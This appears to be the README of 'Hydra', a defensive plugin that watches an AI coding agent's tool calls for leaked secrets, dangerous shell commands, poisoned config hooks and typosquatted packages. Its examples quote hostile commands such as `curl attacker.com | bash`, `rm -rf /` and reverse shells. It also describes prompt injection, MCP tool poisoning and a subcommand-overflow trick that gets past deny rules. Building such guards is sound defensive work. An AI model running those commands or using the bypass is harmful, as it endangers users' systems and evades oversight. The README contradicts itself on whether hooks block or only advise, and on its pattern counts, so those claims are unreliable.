## TL;DR

**In plain English:** Your AI just typed an AWS key into a committed file, ran `rm -rf ~/`, and pip-installed a typosquatted package. Hydra blocks each one before it lands.

**Technically:** R1 Aho-Corasick pattern engine scans 1,844 patterns across 20 databases (310 secret patterns + 156 OWASP/CWE-mapped vulns + 105 dangerous-ops + more) on every Write/Edit; R2 Shannon entropy analysis catches high-entropy strings that evade regex; R4 Markov Action Classification classifies Bash subcommands and surfaces dangerous ops at PreToolUse via advisory injection (exit 0 + stderr per `../vis/packages/core/conduct/hooks.md`). Every finding is keyed to a real CVE or CWE; no finding is fabricated from heuristics alone.

---

## Origin

**Hydra** takes its name from **Twilight Forest** — the swamp-dwelling multi-headed boss whose heads regenerate faster than they can be severed, forcing the player to strike every weak point at once. Security vulnerabilities work the same way: suppress one surface and two more emerge. Hydra finds them before they find you.

The question this plugin answers: *Is it safe?*

## Who this is for

- Teams who've accepted that AI-assisted development opens attack surfaces traditional scanners don't cover — poisoned `.claude/settings.json` hooks, prompt-injection-to-RCE chains, typosquatted deps the agent pulled in.
- Security-conscious developers who want findings keyed to real CVEs and CWEs, not vendor branding.
- Engineers running in environments where cloud security SaaS isn't an option — Hydra is bash + jq, no dependencies, no outbound calls.

Not for:

- Replacing your language-native linter / type-checker — Hydra complements them, doesn't duplicate them.
- Environments where advisory warnings are insufficient — Hydra's hooks inform, they don't silently block (see [../vis/packages/core/conduct/hooks.md](../vis/packages/core/conduct/hooks.md)).

## How It Works

Hydra doesn't scan after the fact. It **intercepts** — before secrets hit disk, before dangerous commands execute, before malicious configs load.

At **SessionStart**, config-shield scans repo configs for CVE-matched attack signatures (R5). **PreToolUse** on Bash routes through action-guard (R4 + R7 advisory) and, for install verbs, package-gate (5 supply-chain risk signals). **PreToolUse** on WebFetch seeds a per-session canary token; **PreToolUse** on every tool checks capability-fence against the active skill's declared `allowed-tools`. **PostToolUse** on Write/Edit runs secret-scanner (R1 + R2) and vuln-detector (R3) in parallel; **PostToolUse** on WebFetch/WebSearch/Bash-network logs destinations via egress-monitor and scans for canary leakage. audit-trail logs every event with an HMAC hash-chain (tamper-evident) and drives R8 EMA posture decay across sessions. **license-gate** and **sbom-emitter** run at skill-invoke / release.yml time for compliance. The diagram below shows the bindings.

</sub>

No permission prompts. No manual scanning. Every tool call is monitored. Dangerous commands are blocked before they execute.

## What Makes Hydra Different

### It runs at write-time, not push-time

GitHub Secret Scanning runs on push. Snyk runs in CI. semgrep runs in a pipeline. By the time they catch something, the secret is already in git history, the vulnerability is already deployed, the command has already executed.

Hydra hooks into Claude Code's tool lifecycle. `scan-secrets.sh` fires on every Write/Edit. `guard-action.sh` fires on every Bash call — **before** it executes. Exit code 2 blocks the tool entirely. The secret never reaches the file. The `rm -rf /` never runs.

### It blocks commands, not just reports them

Action-guard is a **PreToolUse** hook — it sees the command before Claude Code executes it. When it detects `rm -rf /`, `DROP TABLE`, `curl | bash`, or a reverse shell, it exits with code 2 and the command is cancelled.

```
[Hydra] BLOCKED: Recursive force delete from filesystem root (mode: balanced)
```

Three strictness modes:

| Mode | Block patterns | Warn patterns | Use when |
|------|---------------|---------------|----------|
| **strict** | BLOCK | BLOCK | High-security environments, prod-adjacent repos |
| **balanced** (default) | BLOCK | WARN (stderr) | Day-to-day development |
| **permissive** | WARN | WARN | Trusted code, prototyping |

### It detects attacks no other tool catches

**Config poisoning** (R5): Scans for malicious config files on session start — `.claude/settings.json` with hooks that execute `curl attacker.com | bash`, `.claudecode/settings.json` stealing API keys, `.vscode/tasks.json` auto-executing on folder open. Real CVEs that no other tool detects.

**AI agent attacks**: 116 patterns for prompt injection, MCP tool poisoning (incl. rug-pull descriptor mutation + schema `$ref` remote-load + homoglyph tool-name spoofing), invisible Unicode in rules files, markdown-image exfiltration (CamoLeak CVE-2025-59145), ANSI-escape output smuggling, jailbreak detection, and rules file backdoors. Built for the age of coding agents.

**Subcommand overflow** (R7): Adversa AI discovered that commands with 50+ subcommands bypass deny rules. Hydra counts first, matches second.

**Phantom dependencies** (R6): 20% of AI-suggested packages don't exist (USENIX 2025). Attackers register those names. 199 known hallucinated/typosquatted packages + Levenshtein distance catches the rest.

### It never logs your secrets

Every layer enforces masking. `mask_secret()` shows only first 4 and last 4 characters:

```
[Hydra] CRITICAL SECRET: aws-access-key-id in config.py:12 (masked: AKIA...MPLE)
```

The full value never appears in stderr, audit logs, metrics, or reports. Not in any code path.

### It learns across sessions

The **EMA Posture Decay** engine (R8) tracks security posture over time:

<p align="center"><img src="docs/assets/math/r8-ema.svg" alt="r_new = alpha · s_current + (1 - alpha) · r_prior; alpha = 0.3"></p>

Patterns you consistently dismiss get lower severity. Chronic vulnerabilities escalate. The engine gets smarter with every session.

## The Full Lifecycle

A single session flows left to right through five stages. **Config Shield** runs once at SessionStart and reports via `/hydra:config-check`. Every Bash call routes through **Action Guard** (PreToolUse, `/hydra:safety`). If the command is allowed, every Write/Edit fans out in parallel to **Secret Scanner** (`/hydra:secrets`) and **Vuln Detector** (`/hydra:vulns`). All events land in **Audit Trail** (`/hydra:audit`).

## Install

Hydra ships as 5 plugins layering defenses across SessionStart / PreToolUse / PostToolUse. One meta-plugin — `full` — lists all five as dependencies, so a single install pulls in the whole stack.

**In Claude Code** (recommended):

```
/plugin marketplace add enchanter-ai/hydra
/plugin install full@hydra
```

Claude Code resolves the dependency list and installs all 5 plugins. Verify with `/plugin list`.

**Want to cherry-pick?** Individual plugins are still installable by name — e.g. `/plugin install hydra-secret-scanner@hydra` if you only need credential scanning. Each plugin covers a different attack surface, though, so `full@hydra` is the path we recommend for real defense-in-depth.

**Via shell** (also installs `shared/*.sh` and `shared/scripts/*.py` locally so hooks work offline):

```bash
bash <(curl -s https://raw.githubusercontent.com/enchanter-ai/hydra/main/install.sh)
```

## Quickstart

```bash
git clone https://github.com/enchanter-ai/hydra
cd hydra
./scripts/bootstrap.sh    # canonical first command — installs vis sibling
```

Without `./scripts/bootstrap.sh`, conduct imports will silently miss and Claude Code's `@`-loader will fail-soft. Always bootstrap first.
## 11 Plugins, 11 Agents, 1,844 Patterns

Five **scanner plugins** (the original lineup), four **advisory hook plugins** (added 2026-05-05) that close supply-chain, exfil, prompt-injection, and capability-fence gaps, plus two **compliance plugins** (license-gate, sbom-emitter — added 2026-05-05, originally drafted in pech then re-homed here as supply-chain belongs under security).

| Plugin | Command | What | Agent |
|--------|---------|------|-------|
| secret-scanner | `/hydra:secrets` | 319 secret patterns + entropy analysis | scanner (Haiku) |
| vuln-detector | `/hydra:vulns` | 1,525 vulnerability patterns across 98 CWEs | analyzer (Sonnet) |
| action-guard | `/hydra:safety` | 113 dangerous ops; **advisory** (was blocking) | guardian (Sonnet) |
| config-shield | `/hydra:config-check` | 122 config attack signatures, 8 CVEs | inspector (Sonnet) |
| audit-trail | `/hydra:audit` | HMAC hash-chain JSONL + audit-verify skill | chronicler (Haiku) |
| **package-gate** | (advisory) | npm/pip/uv/cargo/go/gem pre-install: 5 risk signals | (advisory hook) |
| **egress-monitor** | (advisory) | NDJSON log of every WebFetch/Bash-network destination | (advisory hook) |
| **canary** | (advisory) | Per-session injection canary tokens; PostToolUse leak scan | (advisory hook) |
| **capability-fence** | (advisory) | Subagent-escape detection vs declared `allowed-tools` | (advisory hook) |
| **license-gate** | (skill / CI) | SPDX allow/deny scan over npm + pip dep trees | (skill-invoked) |
| **sbom-emitter** | (skill / CI) | CycloneDX SBOM generation, wired into release.yml | (skill-invoked) |

## What You Get Per Session

Three hook events fan out into three color-coded journals — one per defense layer — and converge on the dark-themed HTML security report + the `/hydra:*` query surface. Color maps defense layers to journals: blue = secret-scanner (R1 + R2 detection) · red = action-guard (R4 + R7 blocking) · yellow = audit-trail (R8 aggregate posture).

## Roadmap

Tracked in [docs/ROADMAP.md](docs/ROADMAP.md) and the shared [ecosystem map](docs/ecosystem.md). For upcoming work specific to Hydra, see issues tagged [roadmap](https://github.com/enchanter-ai/hydra/labels/roadmap). Pattern-database additions (new CVEs, OWASP LLM Top 10 revisions, new CWE coverage) ship in minor / patch releases; the ROADMAP captures engine-level changes.

```

```

The **HTML security report** includes severity distribution bars, CWE pills, finding-by-finding breakdown, per-file risk summary, and an overall verdict (CLEAN / CAUTION / WARNING / CRITICAL).

## The Science Behind Hydra

Every engine is built on a formal mathematical model. Full derivations in [`docs/science/README.md`](docs/science/README.md).

### R1: Aho-Corasick Pattern Engine

<p align="center"><img src="docs/assets/math/r1-aho.svg" alt="T(n, m) = O(|T| + |P| + z) where z is the number of matches"></p>

Trie with failure links. The hook uses `grep -Eof` with one pattern per line for native C speed (<50ms). The Python script builds the full automaton for batch scanning.

### R2: Shannon Entropy Analysis

<p align="center"><img src="docs/assets/math/r2-entropy.svg" alt="H(s) = -sum over charset p(c) log2 p(c)"></p>

<p align="center"><img src="docs/assets/math/r2-flag.svg" alt="Flag(s) iff H(s) > 4.5 AND length >= 20"></p>

Catches secrets that don't match any known pattern but have suspiciously high randomness.

### R3: OWASP Vulnerability Graph

<p align="center"><img src="docs/assets/math/r3-owasp.svg" alt="Vulnerable(f) iff some pattern p in the language-specific set matches f and is not inside a comment"></p>

Language-aware CWE pattern matching. Comment detection reduces false positives. Maps to OWASP Top 10 2021.

### R4: Markov Action Classification

<p align="center"><img src="docs/assets/math/r4-class.svg" alt="Class(cmd) ∈ {SAFE, WARN, BLOCK}"></p>

<p align="center"><img src="docs/assets/math/r4-block.svg" alt="BLOCK iff cmd is in the dangerous-op set or has more than 50 subcommands"></p>

State-machine classification against 113 dangerous command patterns. Exit 2 blocks execution.

### R5: Config Poisoning Detection

<p align="center"><img src="docs/assets/math/r5-poison.svg" alt="Poisoned(c) iff some CVE signature matches the contents of c"></p>

122 attack signatures across 30+ config file types. Base64 payload decoding. Hidden Unicode detection.

### R6: Phantom Dependency Detection

<p align="center"><img src="docs/assets/math/r6-levenshtein.svg" alt="Levenshtein edit distance via the standard recurrence: delete, insert, or substitute"></p>

Levenshtein distance for typosquat detection. 199 known hallucinated/malicious packages across 5 ecosystems.

### R7: Subcommand Overflow Detection

<p align="center"><img src="docs/assets/math/r7-overflow.svg" alt="Block(cmd) iff |split(cmd, separators)| > 50"></p>

Adversa AI discovered that safety filters fail when overwhelmed with subcommands. Hydra counts before matching.

### R8: EMA Posture Decay

<p align="center"><img src="docs/assets/math/r8-ema.svg" alt="r_new = alpha · s_current + (1 - alpha) · r_prior; alpha = 0.3"></p>

<p align="center"><img src="docs/assets/math/r8-posture.svg" alt="Posture(t) = 1 - Theta_t / Theta_0"></p>

Cross-session EMA of threat rates. Dismissed patterns decay. Chronic patterns escalate.

## Agent Conduct (11 Modules)

Every skill inherits a reusable behavioral contract from [shared/](shared/) — loaded once into [CLAUDE.md](CLAUDE.md), applied across all plugins. This is how Claude *acts* inside Hydra: deterministic, surgical, verifiable. Not a suggestion; a contract.

| Module | What it governs |
|--------|-----------------|
| [discipline.md](../vis/packages/core/conduct/discipline.md) | Coding conduct: think-first, simplicity, surgical edits, goal-driven loops |
| [context.md](../vis/packages/core/conduct/context.md) | Attention-budget hygiene, U-curve placement, checkpoint protocol |
| [verification.md](../vis/packages/core/conduct/verification.md) | Independent checks, baseline snapshots, dry-run for destructive ops |
| [delegation.md](../vis/packages/core/conduct/delegation.md) | Subagent contracts, tool whitelisting, parallel vs. serial rules |
| [failure-modes.md](../vis/packages/core/conduct/failure-modes.md) | 14-code taxonomy for accumulated-learning logs |
| [tool-use.md](../vis/packages/core/conduct/tool-use.md) | Tool-choice hygiene, error payload contract, parallel-dispatch rules |
| [skill-authoring.md](../vis/packages/skills/conduct/skill-authoring.md) | SKILL.md frontmatter discipline, discovery test |
| [hooks.md](../vis/packages/core/conduct/hooks.md) | Advisory-only hooks, injection over denial, fail-open |
| [precedent.md](../vis/packages/core/conduct/precedent.md) | Log self-observed failures to `state/precedent-log.md`; consult before risky steps |
| [tier-sizing.md](../vis/packages/core/conduct/tier-sizing.md) | Prompt verbosity scales inversely with model tier; Haiku needs mechanical steps, Opus runs on intent |
| [web-fetch.md](../vis/packages/web/conduct/web-fetch.md) | External URL handling: cache, dedup, budget; WebFetch is Haiku-tier-only |

## Architecture

Interactive architecture explorer with plugin diagrams, hook binding maps, and data flow:

**[docs/architecture/](docs/architecture/)** — auto-generated from the codebase.

## Testing

```bash
bash tests/run-all.sh
```

35 tests across all 5 plugins + shared utilities. Tests validate:
- Secret detection (7 tests)
- Vulnerability detection (6 tests)
- Command blocking (7 tests)
- Config scanning (5 tests)
- Audit logging (2 tests)
- Path sanitization (2 tests)
- Pattern database integrity (6 tests — JSON validity, schema compliance, unique IDs, minimum counts, CWE coverage, regex compilation)

## Acknowledgments

Hydra builds on substrate laid by others:

- **[Claude Code](https://github.com/anthropics/claude-code)** (Anthropic) — the plugin surface this work extends.
- **[OWASP](https://owasp.org/)** — LLM Top 10 coverage and CWE reference material.
- **[MITRE ATT&CK](https://attack.mitre.org/)** — technique cross-references in the audit trail.
- **[Keep a Changelog](https://keepachangelog.com/)** — CHANGELOG convention.
- **[Semantic Versioning](https://semver.org/)** — versioning contract.
- **[Contributor Covenant](https://www.contributor-covenant.org/)** — Code of Conduct.
- **[repostatus.org](https://www.repostatus.org/)** — status badge.
- **[Citation File Format](https://citation-file-format.github.io/)** — citation metadata.
- **[Conventional Commits](https://www.conventionalcommits.org/)** — commit convention.

Every one of the 1,844 patterns traces back to a real CVE, research paper, or breach writeup; the audit trail records these references per-finding.

## Versioning & release cadence

Hydra follows [Semantic Versioning](https://semver.org/spec/v2.0.0.html). Breaking changes land on major bumps only; the [CHANGELOG](CHANGELOG.md) flags them explicitly. Release cadence is opportunistic — tags land when accumulated fixes or features justify a cut, not on a fixed schedule. Pattern-database refreshes (new CVEs, CWE revisions, OWASP updates) are **not** breaking and ship in minor / patch releases; hook-contract, audit-schema, or severity-scale changes **are** breaking. Migration notes between majors live in [docs/upgrading.md](docs/upgrading.md).

## Role in the ecosystem

Hydra is the **security layer** — and it runs first. At SessionStart, `config-shield` scans the repo for poisoned hooks, suspicious MCP servers, and obfuscated backdoors **before any agent has acted**, so downstream sibling plugins operate on a trusted surface. During the session, `action-guard`, `secret-scanner`, and `vuln-detector` fan out across tool events; `audit-trail` records every finding with severity + CVE/CWE reference.

Hydra does not engineer prompts (Wixie's lane), track tokens (Emu's lane), score change trust (Crow's lane), review code correctness (Lich's lane), or orchestrate git workflow (Sylph's lane). It decides whether the *environment* is hostile.

See [docs/ecosystem.md § Data Flow Between Plugins](docs/ecosystem.md#data-flow-between-plugins) for the full map.
